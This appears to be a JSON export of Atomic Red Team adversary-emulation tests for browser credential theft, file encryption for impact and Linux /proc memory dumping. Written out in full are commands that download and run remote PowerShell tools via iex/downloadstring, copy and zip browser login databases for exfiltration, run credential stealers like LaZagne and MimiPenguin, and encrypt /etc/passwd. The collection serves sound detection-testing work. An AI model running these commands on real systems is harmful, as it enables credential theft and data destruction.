                        "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"
                    },
                    {
                        "description": "Firefox profile directory must be present\n",
                        "prereq_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"$env:temp\\firefox.msi\"\nmsiexec.exe /i \"$env:temp\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"
                    },
                    {
                        "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
                        "prereq_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"$env:temp\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from $env:temp\\VS_BuildTools.exe.\"\n"
                    },
                    {
                        "description": "Python must be installed\n",
                        "prereq_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"$env:temp\\python_setup.exe\"\nStart-Process -FilePath $env:TEMP\\python_setup.exe -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
                    },
                    {
                        "description": "Pip must be installed.\n",
                        "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip -v) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "invoke-webrequest \"https://bootstrap.pypa.io/ez_setup.py\" -outfile \"$env:temp\\ez_setup.py\"      \ninvoke-webrequest \"https://bootstrap.pypa.io/get-pip.py\" -outfile \"$env:temp\\get-pip.py\"\ncmd /c \"$env:temp\\ez_setup.py\"\ncmd /c \"$env:temp\\get-pip.py\"\n"
                    },
                    {
                        "description": "Pycryptodome library must be installed \n",
                        "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pycryptodome) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"
                    },
                    {
                        "description": "Pyasn1 library must be installed \n",
                        "prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pyasn1) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n",
                    "cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n"
                }
            },
            {
                "name": "LaZagne.py - Dump Credentials from Firefox Browser",
                "auto_generated_guid": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
                "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "lazagne_path": {
                        "description": "Path you put LaZagne Github with LaZagne.py",
                        "type": "String",
                        "default": "/tmp/LaZagne/Linux"
                    },
                    "specific_module": {
                        "description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
                        "type": "string",
                        "default": "browsers -firefox"
                    },
                    "output_file": {
                        "description": "This is where output for the Firefox passwords goes",
                        "type": "String",
                        "default": "/tmp/firefox_password.txt"
                    }
                },
                "dependency_executor_name": "sh",
                "dependencies": [
                    {
                        "description": "Get Lazagne from Github and install requirements",
                        "prereq_command": "test -f #{lazagne_path}/laZagne.py",
                        "get_prereq_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"
                    },
                    {
                        "description": "Needs git, python3 and some pip stuff",
                        "prereq_command": "which git && which python3 && which pip",
                        "get_prereq_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
                    }
                ],
                "executor": {
                    "command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
                    "cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}",
                    "name": "sh",
                    "elevation_required": true
                }
            },
            {
                "name": "Stage Popular Credential Files for Exfiltration",
                "auto_generated_guid": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
                "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "powershell",
                    "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
                    "cleanup_command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n"
                }
            },
            {
                "name": "WinPwn - BrowserPwn",
                "auto_generated_guid": "764ea176-fb71-494c-90ea-72e9d85dce76",
                "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
                    "cleanup_command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - Loot local Credentials - mimi-kittenz",
                "auto_generated_guid": "ec1d0b37-f659-4186-869f-31a554891611",
                "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive",
                    "name": "powershell"
                }
            },
            {
                "name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
                "auto_generated_guid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
                "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
                    "name": "powershell"
                }
            },
            {
                "name": "Simulating Access to Chrome Login Data - MacOS",
                "auto_generated_guid": "124e13e5-d8a1-4378-a6ee-a53cd0c7e369",
                "description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
                "supported_platforms": [
                    "macos"
                ],
                "executor": {
                    "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n",
                    "cleanup_command": "rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n",
                    "name": "sh"
                }
            },
            {
                "name": "WebBrowserPassView - Credentials from Browser",
                "auto_generated_guid": "e359627f-2d90-4320-ba5e-b0f878155bbe",
                "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "webbrowserpassview_path": {
                        "description": "Path to the WebBrowserPassView executable ",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n",
                        "prereq_command": "if (Test-Path #{webbrowserpassview_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile #{webbrowserpassview_path}\n"
                    }
                ],
                "executor": {
                    "command": "Start-Process #{webbrowserpassview_path}\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n",
                    "name": "powershell",
                    "elevation_required": true
                }
            },
            {
                "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
                "auto_generated_guid": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
                "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
                "supported_platforms": [
                    "windows"
                ],
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "Google Chrome must be on the device.\n",
                        "prereq_command": "'if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}'\n",
                        "get_prereq_command": "$installer = \"$env:temp\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.msi https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
                    },
                    {
                        "description": "BrowserCollector must exist in the bin directory\n",
                        "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\""
                    },
                    {
                        "description": "Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
                        "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\") {exit 0} else {exit 1}",
                        "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\""
                    }
                ],
                "executor": {
                    "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"$env:temp\" > $null\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n.\\BrowserCollector.exe\n",
                    "cleanup_command": "Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"$env:temp\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nRemove-Item \"$env:temp\\Login Data\" > $null\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1486",
        "display_name": "Data Encrypted for Impact",
        "atomic_tests": [
            {
                "name": "Encrypt files using gpg (Linux)",
                "auto_generated_guid": "7b8ce084-3922-4618-8d22-95f996173765",
                "description": "Uses gpg to encrypt a file\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "pwd_for_encrypted_file": {
                        "description": "the password that you want for the encrypted file",
                        "type": "String",
                        "default": "passwd"
                    },
                    "encrypted_file_path": {
                        "description": "path to the encrypted file",
                        "type": "Path",
                        "default": "/tmp/passwd.gpg"
                    },
                    "input_file_path": {
                        "description": "path to the file that you want to encrypt",
                        "type": "Path",
                        "default": "/etc/passwd"
                    },
                    "encryption_alg": {
                        "description": "encryption algorithm of the file",
                        "type": "String",
                        "default": "AES-256"
                    }
                },
                "dependency_executor_name": "bash",
                "dependencies": [
                    {
                        "description": "Finds where gpg is located\n",
                        "prereq_command": "which_gpg=`which gpg`\n",
                        "get_prereq_command": "(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
                    }
                ],
                "executor": {
                    "name": "bash",
                    "elevation_required": false,
                    "command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n",
                    "cleanup_command": "rm #{encrypted_file_path}\n"
                }
            },
            {
                "name": "Encrypt files using 7z (Linux)",
                "auto_generated_guid": "53e6735a-4727-44cc-b35b-237682a151ad",
                "description": "Uses 7z to encrypt a file\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "pwd_for_encrypted_file": {
                        "description": "the password that you want for the encrypted file",
                        "type": "String",
                        "default": "passwd"
                    },
                    "encrypted_file_path": {
                        "description": "path to the encrypted file",
                        "type": "Path",
                        "default": "/tmp/passwd.zip"
                    },
                    "input_file_path": {
                        "description": "path to the file that you want to encrypt",
                        "type": "Path",
                        "default": "/etc/passwd"
                    }
                },
                "dependency_executor_name": "bash",
                "dependencies": [
                    {
                        "description": "Finds where 7z is located\n",
                        "prereq_command": "which_7z=`which 7z`\n",
                        "get_prereq_command": ""
                    }
                ],
                "executor": {
                    "name": "bash",
                    "elevation_required": false,
                    "command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n",
                    "cleanup_command": "$which_7z e #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
                }
            },
            {
                "name": "Encrypt files using ccrypt (Linux)",
                "auto_generated_guid": "08cbf59f-85da-4369-a5f4-049cffd7709f",
                "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "cped_file_path": {
                        "description": "path where you want your copied file to be",
                        "type": "Path",
                        "default": "/tmp/passwd"
                    },
                    "root_input_file_path": {
                        "description": "path to the file that you want to be encrypted if you are root user",
                        "type": "Path",
                        "default": "/etc/passwd"
                    },
                    "user_input_file_path": {
                        "description": "path to file that you want to be encrypted if you are normal user",
                        "type": "Path",
                        "default": "~/.bash_history"
                    },
                    "impact_command": {
                        "description": "command to show impact of encryption",
                        "type": "String",
                        "default": "sudo su"
                    }
                },
                "dependency_executor_name": "bash",
                "dependencies": [
                    {
                        "description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n",
                        "prereq_command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [[ $USER == \"root\" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi\n",
                        "get_prereq_command": "(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
                    }
                ],
                "executor": {
                    "name": "bash",
                    "elevation_required": false,
                    "command": "if [[ $USER == \"root\" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n",
                    "cleanup_command": "if [[ $USER == \"root\" ]]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi \n"
                }
            },
            {
                "name": "Encrypt files using openssl (Linux)",
                "auto_generated_guid": "142752dc-ca71-443b-9359-cf6f497315f1",
                "description": "Uses openssl to encrypt a file\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "private_key_path": {
                        "description": "path to the private key",
                        "type": "Path",
                        "default": "/tmp/key.pem"
                    },
                    "public_key_path": {
                        "description": "path to the public key",
                        "type": "Path",
                        "default": "/tmp/pub.pem"
                    },
                    "encryption_bit_size": {
                        "description": "size of the bit of encryption",
                        "type": "Integer",
                        "default": 2048
                    },
                    "encrypted_file_path": {
                        "description": "path to the encrypted file",
                        "type": "Path",
                        "default": "/tmp/passwd.zip"
                    },
                    "input_file_path": {
                        "description": "path to the file that you want to encrypt",
                        "type": "Path",
                        "default": "/etc/passwd"
                    }
                },
                "dependency_executor_name": "bash",
                "dependencies": [
                    {
                        "description": "Finds where openssl is located\n",
                        "prereq_command": "which_openssl=`which openssl`\n",
                        "get_prereq_command": ""
                    }
                ],
                "executor": {
                    "name": "bash",
                    "elevation_required": false,
                    "command": "$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n",
                    "cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
                }
            },
            {
                "name": "PureLocker Ransom Note",
                "auto_generated_guid": "649349c7-9abf-493b-a7a2-b1aa4d141528",
                "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "name": "command_prompt",
                    "elevation_required": true,
                    "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n",
                    "cleanup_command": "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n"
                }
            }
        ]
    },
    {
        "attack_technique": "T1003.007",
        "display_name": "OS Credential Dumping: Proc Filesystem",
        "atomic_tests": [
            {
                "name": "Dump individual process memory with sh (Local)",
                "auto_generated_guid": "7e91138a-8e74-456d-a007-973d67a0bb80",
                "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Path where captured results will be placed",
                        "type": "Path",
                        "default": "/tmp/T1003.007.bin"
                    },
                    "script_path": {
                        "description": "Path to script generating the target process",
                        "type": "Path",
                        "default": "/tmp/T1003.007.sh"
                    },
                    "pid_term": {
                        "description": "Unique string to use to identify target process",
                        "type": "String",
                        "default": "T1003.007"
                    }
                },
                "dependencies": [
                    {
                        "description": "Script to launch target process must exist\n",
                        "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
                        "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
                    }
                ],
                "executor": {
                    "name": "sh",
                    "elevation_required": true,
                    "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
                    "cleanup_command": "rm -f \"#{output_file}\"\n"
                }
            },
            {
                "name": "Dump individual process memory with Python (Local)",
                "auto_generated_guid": "437b2003-a20d-4ed8-834c-4964f24eec63",
                "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Path where captured results will be placed",
                        "type": "Path",
                        "default": "/tmp/T1003.007.bin"
                    },
                    "script_path": {
                        "description": "Path to script generating the target process",
                        "type": "Path",
                        "default": "/tmp/T1003.007.sh"
                    },
                    "python_script": {
                        "description": "Path to script generating the target process",
                        "type": "Path",
                        "default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"
                    },
                    "pid_term": {
                        "description": "Unique string to use to identify target process",
                        "type": "String",
                        "default": "T1003.007"
                    }
                },
                "dependencies": [
                    {
                        "description": "Script to launch target process must exist\n",
                        "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
                        "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
                    },
                    {
                        "description": "Requires Python\n",
                        "prereq_command": "(which python || which python3 || which python2)\n",
                        "get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
                    }
                ],
                "executor": {
                    "name": "sh",
                    "elevation_required": true,
                    "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
                    "cleanup_command": "rm -f \"#{output_file}\"\n"
                }
            },
            {
                "name": "Capture Passwords with MimiPenguin",
                "auto_generated_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c",
                "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
                "supported_platforms": [
                    "linux"
                ],
                "input_arguments": {
                    "output_file": {
                        "description": "Path where captured results will be placed",
                        "type": "Path",
                        "default": "/tmp/T1003.007Test3.txt"
                    },
                    "MimiPenguin_Location": {
                        "description": "Path of MimiPenguin script",
                        "type": "Path",
                        "default": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
                    }
                },
                "dependency_executor_name": "sh",
                "dependencies": [
                    {
                        "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
                        "prereq_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
                        "get_prereq_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"
                    },
                    {
                        "description": "Strings must be installed\n",
                        "prereq_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
                        "get_prereq_command": "sudo apt-get -y install binutils\n"
                    },
                    {
                        "description": "Python2 must be installed\n",
                        "prereq_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
                        "get_prereq_command": "sudo apt-get -y install python2       \n"
                    },
                    {
                        "description": "Libc-bin must be installed\n",
                        "prereq_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
                        "get_prereq_command": "sudo apt-get -y install libc-bin        \n"
                    }
                ],
                "executor": {
                    "command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n",
                    "cleanup_command": "rm -f #{output_file} > /dev/null\n",
                    "name": "bash",
                    "elevation_required": true
                }
            }
        ]
    }
]
